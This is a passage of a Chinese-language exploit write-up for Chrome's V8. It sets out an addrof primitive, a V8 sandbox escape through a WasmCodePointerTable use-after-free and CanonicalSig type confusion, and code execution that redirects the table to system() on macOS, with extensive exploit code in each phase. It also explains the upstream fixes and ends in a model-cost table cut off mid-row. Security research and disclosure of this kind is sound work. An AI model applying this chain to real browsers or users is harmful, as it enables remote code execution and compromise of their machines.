放置一个 sentinel array [MARKER_SMI, target_obj, MARKER_SMI]  
，然后在 cage 中扫描 SMI marker pattern。位于两个 marker 之间的 compressed pointer 就是目标 object 的 cage-relative address：  
```
function addrof(obj) {
  addrOfArr[1] = obj
  for (let off = 0x40000; off < 0x800000; off += 4) {
    if (readCage32(off) !== SMI_MARKER) continue
    if (readCage32(off + 8) !== SMI_MARKER) continue
    const ptr = readCage32(off + 4)
    if ((ptr & 1) === 1 && ptr > 0x1000) return ptr
  }
  return 0
}

```  
  
到这里，我们已经拥有：**完整的 in-cage arbitrary R/W + addrof**  
。  
## Phase 10：WasmCPT UAF + CanonicalSig Type Confusion — Sandbox Bypass  
  
这一 phase 会逃出 V8 sandbox，获得**完整 virtual address space R/W**  
。它通过 dispatch table handle corruption 利用 V8 WasmCodePointerTable  
（WCPT）中的 use-after-free，然后伪造 CanonicalSig  
 type confusion，把一个 wasm ref $s  
（struct pointer）重新解释为 raw i64  
。  
  
**来源**  
：该技术基于 chromium issue 452605803，由 Seunghyun Lee（@0x10n）报告；它本身也是 chromium issue 446113730 的一个变体。两者都展示了在具备 in-sandbox corruption primitive 时的 V8 sandbox bypass（我们的 CVE-2026-5873 OOB 提供了这一点）。  
### 背景：这些表是什么？  
  
V8 的 sandbox 通过 indirection tables，把“trusted”（sandbox 外）数据与“untrusted”（sandbox 内）objects 隔离开：  
  
<table><thead><tr><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">表</span></section></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">作用</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><strong style="color: rgb(0, 0, 0);font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgba(0, 0, 0, 0);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;margin-top: 0px;margin-bottom: 0px;margin-left: 0px;margin-right: 0px;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-top-style: none;border-bottom-style: none;border-left-style: none;border-right-style: none;border-top-width: 3px;border-bottom-width: 3px;border-left-width: 3px;border-right-width: 3px;border-top-color: rgba(0, 0, 0, 0.4);border-bottom-color: rgba(0, 0, 0, 0.4);border-left-color: rgba(0, 0, 0, 0.4);border-right-color: rgba(0, 0, 0, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><span leaf="">TrustedPointerTable (TPT)</span></strong></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">将 in-sandbox handles 映射到 out-of-sandbox trusted objects</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><strong style="color: rgb(0, 0, 0);font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgba(0, 0, 0, 0);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;margin-top: 0px;margin-bottom: 0px;margin-left: 0px;margin-right: 0px;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-top-style: none;border-bottom-style: none;border-left-style: none;border-right-style: none;border-top-width: 3px;border-bottom-width: 3px;border-left-width: 3px;border-right-width: 3px;border-top-color: rgba(0, 0, 0, 0.4);border-bottom-color: rgba(0, 0, 0, 0.4);border-left-color: rgba(0, 0, 0, 0.4);border-right-color: rgba(0, 0, 0, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><span leaf="">WasmCodePointerTable (WCPT)</span></strong></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">将 handles 映射到 wasm function entrypoints + signature hashes</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><strong style="color: rgb(0, 0, 0);font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgba(0, 0, 0, 0);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;margin-top: 0px;margin-bottom: 0px;margin-left: 0px;margin-right: 0px;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-top-style: none;border-bottom-style: none;border-left-style: none;border-right-style: none;border-top-width: 3px;border-bottom-width: 3px;border-left-width: 3px;border-right-width: 3px;border-top-color: rgba(0, 0, 0, 0.4);border-bottom-color: rgba(0, 0, 0, 0.4);border-left-color: rgba(0, 0, 0, 0.4);border-right-color: rgba(0, 0, 0, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><span leaf="">WasmDispatchTable</span></strong></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">每张 table 的 </span><code><span leaf="">(target, ref, sig)</span></code><span leaf=""> entries 数组，用于 </span><code><span leaf="">call_indirect</span></code></section></td></tr></tbody></table>  
  
当 wasm module import 一个 JS function 时，V8 会创建一个 **dispatch_table_for_imports  
 **，也就是保存 import 的 WCPT handle 和 WasmImportWrapperHandle  
 的 WasmDispatchTable  
（后者是控制 WCPT entry 生命周期的 shared_ptr  
）。  
  
关键 insight 是：WasmTableObject  
（in-sandbox）在 offset 0x1c  
 处有一个 trusted pointer handle，指向它的 WasmDispatchTable  
（out-of-sandbox）。有了 in-sandbox R/W，我们就可以**覆盖这个 handle**  
，让它指向另一张 dispatch table，具体来说就是 import dispatch table。  
### 高层策略  
1. 通过分配 marker tables 发现 trusted pointer handle stride  
  
1. 覆盖某张 table 的 dispatch handle，让它指向 import dispatch table  
  
1. grow 被移植 handle 的 table → V8 释放 import 的 WCPT entry（UAF）  
  
1. 实例化一个新的 wasm module，让其中函数 reclaim 已释放的 WCPT entry  
  
1. reclaiming function 的 CanonicalSig  
 现在可通过被 corrupt 的 import call path 访问  
  
1. 覆盖 CanonicalSig  
 return types：(i64, ref $s)  
 → (i64, i64)  
  
1. struct reference 现在被重新解释为 raw i64  
 → 完整 virtual R/W  
  
### Step 1：Handle Stride Discovery  
  
每个 WasmTableObject  
 都在 offset kTDTOffset = 0x1c  
 处有一个 TrustedDispatchTable  
 handle。连续分配的 table 会在 TPT 中得到连续的 handles：  
```
let dummy_table0 = new WebAssembly.Table({
  initial: 1,
  maximum: 1,
  element: 'anyfunc',
})
// ... wasm module instantiation happens here (allocates several TPT entries) ...
let dummy_table1 = new WebAssembly.Table({
  initial: 1,
  maximum: 1,
  element: 'anyfunc',
})
let dummy_table2 = new WebAssembly.Table({
  initial: 1,
  maximum: 1,
  element: 'anyfunc',
})

let h0 = readCage32(addrof(dummy_table0) + kTDTOffset)
let h1 = readCage32(addrof(dummy_table1) + kTDTOffset)
let h2 = readCage32(addrof(dummy_table2) + kTDTOffset)
let h_stride = h2 - h1 // typically 0x200
let h_new = (h1 - h0) / h_stride - 1 // entries created by wasm instantiation

```  
  
h_stride  
 是 trusted pointer table entry size。h_new  
 告诉我们在 dummy_table0  
 和 dummy_table1  
 之间，wasm module instantiation 创建了多少个 TPT entries；这会用于计算 target_ofs  
。  
### Step 2：带 Import 的 Wasm Module（inst1 — caller）  
  
第一个 module import 一个签名为 (i64, i64) → (i64, ref $s)  
 的函数：  
```
let builder = new WasmModuleBuilder()
let $s = builder.addStruct([makeField(kWasmI64, true)])
let $sig_ls_ll = builder.addType(
  makeSig([kWasmI64, kWasmI64], [kWasmI64, wasmRefNullType($s)]),
)
let $fn = builder.addImport('import', 'fn', $sig_ls_ll)
builder.addDeclarativeElementSegment([$fn])

```  
  
call_fn  
 export 会通过 ref.func  
 + call_ref  
 调用 import（不是 call_indirect  
）：  
```
let $call_fn = builder
  .addFunction('call_fn', $sig_ls_ll)
  .addBody([
    kExprLocalGet,
    0,
    kExprLocalGet,
    1,
    kExprRefFunc,
    $fn, // push funcref for the import
    kExprCallRef,
    $sig_ls_ll, // call via ref (not indirect)
  ])
  .exportFunc()
let instance = builder.instantiate({ import: { fn: () => [42n, null] } })
let { call_fn } = instance.exports
call_fn(0n, 0n) // force ref.func instantiation

```  
  
**为什么使用 call_ref 而不是 call_indirect？**  
 Bug 446113730 使用的是 kExprCallFunction $fn  
（通过 dispatch_table_for_imports  
 直接调用 import）。Bug 452605803 改用 kExprCallRef  
。ref.func  
 指令会创建一个 WasmInternalFunction  
（= WasmFuncRef  
），它持有 import wrapper 的 WCPT call target。关键在于，WasmInternalFunction  
 持有 WCPT call target 时，**并不持有 WasmImportWrapperHandle  
**（也就是 reference count holder）。它依赖 WasmImportData  
（它的 implicit_arg  
）来保持对象存活。但在我们 corrupt dispatch table 并释放 entry 之后，WasmInternalFunction  
 仍然指向已经释放的 WCPT slot。  
### Step 3：释放 Import 的 WCPT Entry  
  
我们覆盖一张新 table 的 dispatch handle，让它指向 import dispatch table 的 handle，然后 grow 这张 table。grow 会把 dispatch table 替换成新表，并丢弃旧 entries 对应的 shared_ptr<WasmImportWrapperHandle>  
，这会把 refcount 减到 0，并**释放 WCPT entry**  
：  
```
let target_ofs = 0x7 // number of TPT entries back from h1 to reach the import table
let h_target = h1 - h_stride * target_ofs
let tt = new WebAssembly.Table({
  initial: 0,
  maximum: 0x10,
  element: 'anyfunc',
})
writeCage32(addrof(tt) + kTDTOffset, h_target) // transplant handle
tt.grow(0x10) // triggers free

```  
  
此后，call_fn  
 的 import wrapper 使用的那个 WCPT entry 已经**被释放但仍被引用**  
，引用方是 Step 2 中的 WasmInternalFunction  
。  
### Step 4：用 Type-Compatible Functions Reclaim（inst2 — callee）  
  
我们实例化第二个 module，其中的函数会 reclaim 已释放的 WCPT slots：  
```
let builder2 = new WasmModuleBuilder()
let $s2 = builder2.addStruct([makeField(kWasmI64, true)])
let $sig_ls_ll2 = builder2.addType(
  makeSig([kWasmI64, kWasmI64], [kWasmI64, wasmRefNullType($s2)]),
)
let $mem = builder2.addMemory64(1) // memory64 for full 64-bit addressing

```  
  
called_fn  
 函数会基于它的 memory64  
 同时作为 read 和 write primitive：  
```
let $called_fn = builder2
  .addFunction('called_fn', $sig_ls_ll2)
  .addBody([
    kExprLocalGet,
    0, // param 0 = address (or -1 for read mode)
    ...wasmI64Const(-1n),
    kExprI64Eq,
    kExprIf,
    kWasmI64,
    kExprLocalGet,
    1, // param 1 = read address
    kExprI64LoadMem,
    1,
    0, // load 8 bytes from memory64
    kExprElse,
    kExprLocalGet,
    0, // param 0 = write address
    kExprLocalGet,
    1, // param 1 = value
    kExprI64StoreMem,
    1,
    0, // store 8 bytes to memory64
    ...wasmI64Const(0),
    kExprEnd,
    kExprRefNull,
    kNullRefCode, // second return value: null ref
  ])
  .exportFunc()

```  
  
inst2  
 会在 free 之后实例化，因此它的函数的 WCPT entries 会 reclaim 已释放的 slots。由于 V8 会对相同的 wasm signatures 做去重，这两个 modules 会共享同一个 CanonicalSig  
。  
### Step 5：Type Confusion Setup  
  
当 call_fn  
（来自 inst1）调用 import 时，它现在会经过已经被释放并 reclaim 的 WCPT entry。调用路径会把 WasmImportData  
（用于 import）与 WasmTrustedInstanceData  
（用于 called_fn  
）混淆。巧合的是，WasmTrustedInstanceData  
 中的 kMemory0StartOffset  
 等于 WasmImportData  
 中的 kWasmImportDataSigOffset  
。因此，当 called_fn  
 访问自己的 memory64  
 时，它读取到的 base address 实际上是 import data 中的 **CanonicalSig  
 pointer**。  
  
这意味着 called_fn  
 的 memory loads/stores 会直接作用于 CanonicalSig  
 结构：  
```
function sig_read(ofs) {
  return call_fn(-1n, ofs)[0] // read 8 bytes from CanonicalSig + ofs
}
function sig_write(ofs, val) {
  call_fn(ofs, val)[0] // write 8 bytes to CanonicalSig + ofs
}

```  
  
在通过 corrupted path 调用 called_fn  
 之前，我们会先让它 tier up，避免 Liftoff-specific 代码访问会导致崩溃的 WasmTrustedInstanceData  
 字段：  
```
for (let i = 0; i < 10; i++) called_fn(1n, 2n)
%WasmTierUpFunction(called_fn)

```  
### Step 6：CanonicalSig Layout 与 Type Forging  
  
CanonicalSig  
 结构描述函数的 type signature：  
```
CanonicalSig (V8 13.8):
+0x00: return_count_     (8 bytes, value=2)
+0x08: parameter_count_  (8 bytes, value=2)
+0x10: reps_             (pointer to inline type array)
+0x18: signature_hash_
+0x20: index_
+0x28: reps_[0:2]        (return types: i64, ref $s)
+0x30: reps_[2:4]        (param types: i64, i64)

```  
  
+0x28  
 处的 return types 是 (i64, ref $s)  
。+0x30  
 处的 param types 是 (i64, i64)  
。我们用 param types 覆盖 return types：  
```
let ll = sig_read(0x30n) // read param reps: (i64, i64)
sig_write(0x28n, ll) // overwrite return reps: (i64, ref $s) → (i64, i64)

```  
  
现在 V8 会认为 called_fn  
 返回 (i64, i64)  
，而不是 (i64, ref $s)  
。当 called_fn  
 返回一个 ref $s  
（指向 wasm struct 的 heap pointer）时，caller 会把它解释成 raw i64  
。这会彻底突破 type system。  
### Step 7：完整 Virtual Address R/W  
  
借助伪造后的 signature，我们构造 read64  
 和 write64  
 helper：  
```
let $read64 = builder2
  .addFunction('read64', $sig_l_l)
  .addBody([
    kExprLocalGet,
    0, // address to read
    ...wasmI64Const(0n),
    kExprCallFunction,
    $fn2, // calls through corrupted import → gets (i64, ref $s)
    kGCPrefix,
    kExprStructGet,
    $s2,
    0, // read i64 field from struct
    kExprReturn,
  ])
  .exportFunc()

let $write64 = builder2
  .addFunction('write64', $sig_v_ll)
  .addBody([
    kExprLocalGet,
    0, // address
    ...wasmI64Const(0n),
    kExprCallFunction,
    $fn2, // gets (i64, ref $s)
    kExprLocalGet,
    1, // value
    kGCPrefix,
    kExprStructSet,
    $s2,
    0, // write i64 field into struct
    kExprReturn,
  ])
  .exportFunc()

```  
  
因为 ref $s  
 现在被当作 raw i64  
 处理，struct 的 field access 就变成了对任意 64-bit virtual address 的任意 memory dereference：  
```
function vread64(addr) {
  return read64(BigInt(addr))
}
function vwrite64(addr, val) {
  write64(BigInt(addr), BigInt(val))
}

```  
  
到这里，我们已经拥有**完整 virtual address space R/W**  
，也就是已经逃出了 V8 sandbox。  
### Stack Leak（sig_fnx）  
  
把 fnx  
 signature 的 return_count  
 设置为 0，会导致 caller 把未初始化的 stack slots 当作 return values 读取：  
```
sig_fnx_write(0x0n, 0n) // return_count = 0
let leaks = leak_rec() // returns 32 i64 values from the stack

```  
  
leak_rec  
 会调用一个递归函数（用于压入 frames），然后调用被修改的 fnx  
 import。这些“return values”实际上是陈旧的 stack data，会泄露 JIT code addresses 和 stack pointers。  
### 该问题是如何修复的  
  
该 bug 通过两个 commits 修复：  
  
**Fix 1 — 在 grow 时清空旧 dispatch table entries**  
（1d13848，Clemens Backes，Sep 2025，修复 bug 446113730）：  
  
当 WasmDispatchTable::Grow  
 创建新表时，旧表的 entries 会保留不变。在存在 in-sandbox corruption 的情况下，攻击者仍然可以触达旧表，并使用其中 stale entries（指向已经释放的 WCPT slots）。修复方式是在把 entries 复制到新表之后，清空旧表中的所有 entries：  
```
// Clear old table to avoid dangling uses via in-sandbox corruption.
for (uint32_t i = 0; i < old_length; ++i) {
  old_table->Clear(i, WasmDispatchTable::kNewEntry);
}

```  
  
这样，任何后续通过旧表发起的调用都会立即崩溃。  
  
**Fix 2 — 不再暴露 dispatch_table_for_imports**  
（9fdddb6，Jakob Kummerow，Oct 2025，修复 bug 452605803）：  
  
Fix 1 还不够，因为 bug 452605803 展示了攻击仍然可以通过 ref.func  
 + call_ref  
 成功（WasmInternalFunction  
 在 table 被清空后仍然持有 WCPT call target）。最终修复方式是将 dispatch_table_for_imports  
 完全从 trusted pointer table 中移除，使它**无法被任何 in-sandbox object 访问**  
：  
```
// Make sure the dispatch table for imports is inaccessible from regular
// in-sandbox objects.
#if V8_ENABLE_SANDBOX
  isolate->trusted_pointer_table().Zap(
      dispatch_table_for_imports->self_indirect_pointer_handle());
#endif

```  
  
Zap  
 会用一个无效 sentinel 覆盖 TPT handle。这样即便攻击者 corrupt 了 WasmTableObject  
 的 handle 字段，也无法让它指向 import dispatch table，因为 TPT 中根本不存在可用的有效 handle。import dispatch table 仍由 V8 内部使用（通过直接 C++ pointers），但 in-sandbox JavaScript 或 wasm object 都不能触达它。  
## Phase 11：SANDBOX_BASE Derivation + Isolate Discovery  
### 通过 PartitionAlloc Freelist 获得 SANDBOX_BASE  
```
let pa_buf = new ArrayBuffer(0x2000)
let pa_backing = BigInt(buffer_data_ptr(pa_buf))
pa_buf.transfer(0) // free the backing store

```  
  
释放后，SlotSpanMetadata  
 freelist head（存储在 superpage metadata 区域）中会包含已释放 buffer 的完整 virtual address。减去已知 cage offset 后，就得到 SANDBOX_BASE  
：  
```
let freelist_head = sbox_view.getBigUint64(addr_slot_span_meta, true)
let SANDBOX_BASE = freelist_head - pa_backing

```  
### Isolate Discovery  
  
V8 Isolate  
 会在 offset 0 保存 cage_base_  
（= SANDBOX_BASE  
）。我们从 sig_addr  
 向前扫描（CanonicalSig address 位于靠近 Isolate 的 trusted space 中）：  
```
for (let off = 0x200000n; off < 0x400000n; off += 0x100n) {
  let v = sig_read(off)
  if (v === SANDBOX_BASE) {
    iso_addr = sig_addr + off
    break
  }
}

```  
## Phase 12：通过 WCPT Redirect 实现 RCE  
### Step 1：通过 dyld Cache Pointers 寻找 system()  
  
Isolate 中包含指向 macOS shared dyld cache（libsystem_c 等）的 pointers。我们会在 Isolate 区域扫描 0x180000000..0x200000000  
 范围内的地址（ARM64 macOS 上的 dyld cache region）：  
```
for (let off = 0n; off < 0x4000n; off += 8n) {
  let v = sig_read(iso_base + off)
  if (v >= 0x180000000n && v < 0x200000000n) {
    system_addr = v + 0x49ce8n // printf → system() delta
    break
  }
}

```  
  
delta 0x49ce8  
 是通过 LLDB 在同一个 Chrome process 中比较 printf  
 和 system  
 的地址确定的。  
### Step 2：在 Isolate 中找到 WCPT ExternalReference  
  
WasmCodePointerTable  
 base address 存储在 ExternalReferenceTable  
 中，而后者位于 Isolate 内部。我们通过扫描 1-3 GB 范围内、按 16KB 对齐且不是已知 table bases（TPT、CPT、JDT）的地址来识别它：  
```
let known_bases = new Set([tpt_base, cpt_base, jdt_base])
for (let off = 0x400n; off < 0x20000n; off += 8n) {
  let v = sig_read(iso_base + off)
  if ((v & 0x3fffn) !== 0n) continue // must be 16KB-aligned
  if (v < 0x100000000n || v > 0x300000000n) continue
  if (known_bases.has(v)) continue
  wcpt_real_base = v
  wcpt_ext_ref_offset = off
  break
}

```  
### Step 3：构造 Fake WCPT  
  
在 sandbox 中分配一个 16 MB ArrayBuffer，并将每个 entry 都填成 system()  
：  
```
const FAKE_WCPT_ENTRIES = 1048576
for (let i = 0; i < FAKE_WCPT_ENTRIES; i++) {
  fakeWcptView.setBigUint64(i * 16, system_addr, true) // entrypoint
  fakeWcptView.setBigUint64(i * 16 + 8, 0n, true) // sig hash (unchecked)
}

```  
  
每个 WCPT entry 为 16 bytes：[entrypoint (8)] [signature_hash (8)]  
。通用 JSToWasmWrapperAsm  
 builtin 使用 CallWasmCodePointerNoSignatureCheck  
，因此 hash 会被忽略。  
### Step 4：创建 Trigger Function  
  
一个全新的、此前调用次数为 0 的 Wasm function 会使用**通用**  
 JS-to-Wasm wrapper builtin（不是 compiled wrapper）。这个 builtin 会在运行时从 ExternalReferenceTable  
 加载 WCPT base：  
```
let triggerBuilder = new WasmModuleBuilder()
triggerBuilder
  .addFunction('trigger', makeSig([kWasmI64, kWasmI64], []))
  .addBody([])
  .exportFunc()
let triggerFn = triggerBuilder.instantiate().exports.trigger

```  
### Step 5：Redirect WCPT 并调用 system()  
```
sig_write(iso_base + wcpt_ext_ref_offset, fake_wcpt_vaddr)
triggerFn(cmd_vaddr, 0n)

```  
  
调用 triggerFn  
 时：  
1. 通用 wrapper 从 ExternalReferenceTable  
 读取 WCPT base → 得到 fake_wcpt_vaddr  
  
1. 它查找 trigger function 的 WCPT handle → 从 fake table 中读取 system()  
 地址  
  
1. 它跳转到 system()  
  
1. ARM64 Wasm calling convention：GP param registers 为 {x7, x0, x2, ...}  
，因此第一个 i64 用户参数会映射到 x0  
  
1. system()  
 期待 x0 = const char*  
 → **命令字符串地址正好位于正确的寄存器中**  
  
```
const cmd = 'open /System/Applications/Calculator.app'

```  
### Step 6：Cleanup  
```
sig_write(iso_base + wcpt_ext_ref_offset, wcpt_real_base)

```  
  
恢复原始 WCPT base，防止后续崩溃。  
  
**实验成本：**  
  
<table><thead><tr><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">模型</span></section></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">Tokens</span></section></th><th style="color: rgb(0, 0, 0);font-size: 16px;line-height: 1.5em;letter-spacing: 0em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">成本</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Claude Opus 4.6 (high)</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">2,140M</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">$2,014</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Claude Opus 4.6 (high-thinking)</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">189M</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 